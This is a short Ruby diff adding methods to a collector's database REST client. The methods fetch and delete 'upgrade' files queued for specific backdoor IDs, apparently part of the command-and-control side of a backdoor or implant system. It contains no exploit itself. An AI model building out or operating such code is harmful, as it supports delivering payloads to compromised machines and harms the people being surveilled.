@@ -263,6 +263,36 @@ class DB_rest
     end
   end
 
+  def new_upgrades(bid)
+    begin
+      ret = rest_call('GET', "/backdoor/upgrades/#{bid}")
+
+      upgr = {}
+      # parse the results and get the contents of the uploads
+      JSON.parse(ret.body).each do |elem|
+        request = {:backdoor_id => bid, :upgrade_id => elem['upgrade_id']}
+        upgr[elem['upgrade_id']] = {:filename => elem['filename'],
+                                    :content => rest_call('GET', "/backdoor/upgrade/#{request.to_json}").body }
+        trace :debug, "File retrieved: [#{elem['filename']}] #{upgr[elem['upgrade_id']][:content].length} bytes"
+      end
+
+      return upgr
+    rescue Exception => e
+      trace :error, "Error calling new_upgrades: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def del_upgrade(bid, id)
+    begin
+      request = {:backdoor_id => bid, :upgrade_id => id}
+      return rest_call('DELETE', "/backdoor/upgrade/#{request.to_json}")
+    rescue Exception => e
+      trace :error, "Error calling del_upgrade: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
 end #
 
 end #Collector::
